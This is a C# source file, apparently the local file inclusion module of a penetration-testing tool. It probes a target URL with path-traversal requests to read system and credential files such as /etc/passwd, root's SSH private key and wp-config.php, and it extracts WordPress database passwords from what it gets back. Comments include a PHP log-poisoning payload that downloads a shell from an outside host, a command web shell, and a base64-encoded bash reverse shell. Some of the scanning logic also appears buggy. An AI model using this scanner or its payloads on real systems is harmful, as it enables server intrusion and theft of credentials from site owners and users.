using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using ReeCode;

namespace Reecon
{
    class LFI
    {
        [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0044:Add readonly modifier")]
        private static WebClient wc = new();
        private static string initialPart = "";
        private static int notFoundLength = 0;
        private static int notFoundLength2 = 0;
        private static int bypassMethod = -1;

        public static void Scan(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("LFI Usage: reecon -lfi http://www.site.com/bla.php?include=file");
                return;
            }
            ScanPath(args[1]);
        }

        public static void ScanPath(string path)
        {
            if (!path.StartsWith("http"))
            {
                Console.WriteLine("Error: LFI path must start with http");
                return;
            }
            Console.WriteLine("Starting LFI Scan - This feature is still in Alpha");
            // Init
            InitialChecks(path);

            // Find OS
            var OS = GetOS();

            if (OS == General.OS.Linux)
            {
                List<string> webChecks = new()
                {
                    // General web checks
                    "/var/www/html/.htpasswd",
                    "/var/www/html/forum/.htpasswd",

                    // Wordpress
                    "/var/www/html/wp-config.php",
                    "/var/www/html/wordpress/wp-config.php",
                    "/var/www/wordpress/wp-config.php"
                };
                DoLFI(webChecks);

                // Do nginx checks
                List<string> linux_nginx = new()
                {
                    "/etc/nginx/sites-available/default"
                };
                DoLFI(linux_nginx);

                // Do Apache2 Checks - https://packages.ubuntu.com/eoan/all/apache2/filelist
                List<string> linux_apache = new()
                {
                    "/etc/apache2/sites-available/000-default.conf"
                };
                bool hasApache = DoLFI(linux_apache);
                if (hasApache)
                {
                    // Check for .htpasswd
                    DoLFI(new List<string>() { "/etc/apache2/.htpasswd" });

                    // Apache2 Log Poisoning Path (Very restricted): 
                    bool apache2Log = DoLFI(new List<string>() { "/var/log/apache2/access.log" });
                    if (apache2Log)
                    {
                        // Log poisoning file upload
                        // Mozilla/5.0 <?php file_put_contents('reeshell.php', file_get_contents('http://10.8.8.233:9001/reeshell.php'))?> Firefox/70.0
                        // Mozilla/5.0 <?php system($_GET['cmd']);?> Firefox/70.0 if no callbacks allowed / you can't find the file
                        Console.WriteLine("LFI - Log Poisoning File Upload - Bug Reelix");
                    }
                }

                // Do some logging checks
                List<string> linux_logs = new()
                {
                    "/var/log/vsftpd.log"
                };
                DoLFI(linux_logs);

                // Do MySQL Checks
                List<string> linux_mysql = new()
                {
                    "/etc/my.cnf",
                    "/etc/mysql/my.cnf",
                    "/var/log/mysql/error.log"
                };
                DoLFI(linux_mysql);

                // Do Tomcat9 Checks - https://packages.ubuntu.com/eoan/all/tomcat9/filelist
                List<string> linux_tomcat9 = new()
                {
                    "/etc/cron.daily/tomcat9",
                    "/etc/rsyslog.d/tomcat9.conf",
                    "/usr/lib/sysusers.d/tomcat9.conf",
                    "/usr/lib/tmpfiles.d/tomcat9.conf",
                    "/usr/libexec/tomcat9/tomcat-start.sh",
                    "/usr/share/tomcat9/etc/server.xml",
                    "/usr/share/tomcat9/etc/tomcat-users.xml",
                    "/usr/share/tomcat9/etc/web.xml",
                    "/var/lib/tomcat9/webapps/ROOT/index.html"
                };
                DoLFI(linux_tomcat9);

                // Do basic SSH Checks - https://evi1us3r.wordpress.com/lfi-cheat-sheet/
                List<string> linux_ssh = new()
                {
                    "/etc/ssh/ssh_config",
                    "/etc/ssh/sshd_config",
                    "/root/.ssh/id_rsa",
                    "/root/.ssh/authorized_keys"
                };
                DoLFI(linux_ssh);

            }
            else if (OS == General.OS.Windows)
            {
                // Do IIS Checks
                Console.WriteLine("LFI - Windows - Bug Reelix");
            }
            else
            {
                Console.WriteLine("LFI - Unknown OS - Bug Reelix");
                // Unknown - Do All Checks
            }
            Console.WriteLine("All Checks Done!");
            if (OS == General.OS.Linux)
            {
                Console.WriteLine("Note: If you can create sessions, they can be stored in /tmp/ses_SESSID");
            }
        }

        // Initial Checks
        private static void InitialChecks(string path)
        {
            Console.WriteLine("Scanning: " + path);
            HttpStatusCode statusCode = wc.GetResponseCode(path);
            if (statusCode != HttpStatusCode.OK)
            {
                Console.WriteLine(path + " is not an OK page :(");
                Environment.Exit(0);
            }

            initialPart = path.Substring(0, path.IndexOf("=") + 1);
            // NFL1
            string result = Web.GetHTTPInfo(initialPart + "Reelix").PageText;
            notFoundLength = result.Length; // Check for cases where the page text contains the URL?
            // Some not-found pages can be blank
            if (notFoundLength < 0)
            {
                notFoundLength = 0;
            }
            Console.WriteLine("NFL1: " + notFoundLength);

            // NFL2
            result = Web.GetHTTPInfo(initialPart + "Ree..lix").PageText;
            notFoundLength2 = result.Length;
            if (notFoundLength2 < 0)
            {
                notFoundLength2 = 0;
            }
            Console.WriteLine("NFL2: " + notFoundLength2);
        }

        private static General.OS GetOS()
        {
            // Linux
            List<string> linuxChecks = new()
            {
                "/etc/passwd",
                "/etc/resolv.conf",
                "/var/www/index.php",
                "/var/www/html/index.php",
                "/etc/hostname", // Box Hostname
                "/etc/issue", // Shows the Release
                "/etc/group", // Groups
                "/proc/self/cmdline" // Running commandline
            };
            bool hasResult = DoLFI(linuxChecks);
            if (hasResult)
            {
                return General.OS.Linux;
            }

            // Windows
            List<string> windowsChecks = new()
            {
                "/boot.ini", // Basic boot.ini
                "/inetpub/wwwroot/index.php", // Basic IIS Webserver
                "/Windows/debug/NetSetup.log", // Some basic Windows info
                "/Windows/SoftwareDistribution/ReportingEvents.log", // Windows Patches
                "/Windows/System32/cmd.exe", // What Windows box doesn't have cmd?
                "/Windows/win.ini" // Should have this

                // xampp/apache/logs/access.log
            };
            hasResult = DoLFI(windowsChecks);
            if (hasResult)
            {
                return General.OS.Windows;
            }

            return General.OS.Unknown;
        }

        private static bool DoLFI(List<string> lfiChecks)
        {
            // To Implement:
            // We only need to do a bypass once on the initial OS check.
            // If it's working, it's working - Don't need to try each bypass every time
            // Maybe base64'ing PHP might be useful though...

            // TODO: Null Byte each
            // TODO: Base64 Encode Each --> bla=php://filter/convert.base64-encode/resource=locationHere
            // TODO: UTF8 Each --> bla=php://filter/convert.iconv.utf-8.ascii/resource=locationHere (Thanks spymky)
            // TODO: Assert RCE Exploit: ' and die (show_source('/etc/passwd')) or '
            // ' and die (system('echo YmFzaCAtaSAmPi9kZXYvdGNwLzE5Mi4xNjguNDkuNTYvOTAwMSA8JjE= | base64 -d | bash')) or '
            // TODO: Assert Exploit -> ', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('

            // If it must contain a word
            // php://filter/read=convert.base64-encode/wordhere/resource=flag

            // ../ bypass: %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
            // More: https://book.hacktricks.xyz/pentesting-web/file-inclusion

            // Bypass Method 0: {PATH}
            // Bypass Method 1: /../../../../..{PATH}
            // Bypass Method 2: /../../../../..{PATH}%00

            bool hasResult = false;
            foreach (string check in lfiChecks)
            {
                // Method 0 - {PATH}
                if (bypassMethod == -1)
                {
                    Console.WriteLine($"Testing: {{PATH}} with {check}");
                }
                if (bypassMethod == -1 || bypassMethod == 0)
                {
                    string toCheck = initialPart + check;
                    bool isLFI = TestLFI(toCheck, check, 0);
                    if (isLFI && bypassMethod == -1)
                    {
                        bypassMethod = 0;
                    }
                }
                // Method 1: /../../../../..{PATH}
                if (bypassMethod == -1)
                {
                    Console.WriteLine($"Testing: /../../../../..{{PATH}} with {check}");
                }
                else if (bypassMethod == -1 || bypassMethod == 1)
                {
                    string toCheck = initialPart + "/../../../../.." + check;
                    bool isLFI = TestLFI(toCheck, check, 15);
                    if (isLFI && bypassMethod == -1)
                    {
                        bypassMethod = 1;
                    }
                }
                // Method 2: /../../../../..{PATH}%00
                if (bypassMethod == -1)
                {
                    Console.WriteLine($"Testing: /../../../../..{{PATH}}%00 with {check}");
                }
                else if (bypassMethod == -1 || bypassMethod == 2)
                {
                    string toCheck = initialPart + "/../../../../.." + check + "%00";
                    bool isLFI = TestLFI(toCheck, check, 18);
                    if (isLFI && bypassMethod == -1)
                    {
                        bypassMethod = 2;
                    }
                }
            }
            return hasResult;
        }

        private static bool TestLFI(string fullPath, string check, int bypassLength)
        {
            try
            {
                var requestResult = Web.GetHTTPInfo(fullPath, null);
                if (requestResult.AdditionalInfo == "Timeout")
                {
                    Console.WriteLine("- " + fullPath + " -- Timeout :(");
                    return false;
                }
                string result = requestResult.PageText;
                int resultLength = result.Length;
                if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length + bypassLength)
                    && resultLength != notFoundLength2 && resultLength != (notFoundLength2 + check.Length + bypassLength)
                    && !result.Contains("failed to open stream"))
                {
                    Console.WriteLine("- " + fullPath + " (Len: " + resultLength + ")");
                    ParseUsefulEntries(check, result);
                    return true;
                }
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine("LFI Bug - Bug Reelix: " + ex.Message);
                return false;
                // Nope!
            }
        }

        private static void ParseUsefulEntries(string check, string pageText)
        {
            if (check == "/etc/passwd")
            {
                if (pageText.Contains("root:x:0:0:root:/root"))
                {
                    string passwdText = pageText.Remove(0, pageText.IndexOf("root:x:0:0:root:/root"));
                    List<string> pageLines = passwdText.Replace("\r", "").Split('\n').ToList();
                    foreach (string line in pageLines)
                    {
                        if (line.Contains("/bin/bash") || line.Contains("/home"))
                        {
                            Console.WriteLine("----> " + line);
                        }
                    }
                }
            }
            else if (check == "wp-config.php")
            {
                if (pageText.Contains("DB_USER'") && pageText.Contains("DB_PASSWORD'"))
                {
                    string userText = pageText.Remove(0, pageText.IndexOf("DB_USER'") + 8);
                    userText = userText.Remove(0, (userText.IndexOf("'") + 1));
                    userText = userText.Substring(0, userText.IndexOf("' );"));
                    Console.WriteLine("----> Wordpress Database Username: " + userText);

                    string passText = pageText.Remove(0, pageText.IndexOf("DB_PASSWORD'") + 12);
                    passText = passText.Remove(0, (passText.IndexOf("'") + 1));
                    passText = passText.Substring(0, passText.IndexOf("' );"));
                    Console.WriteLine("----> Wordpress Database Password: " + passText);
                }
            }
        }
    }
}
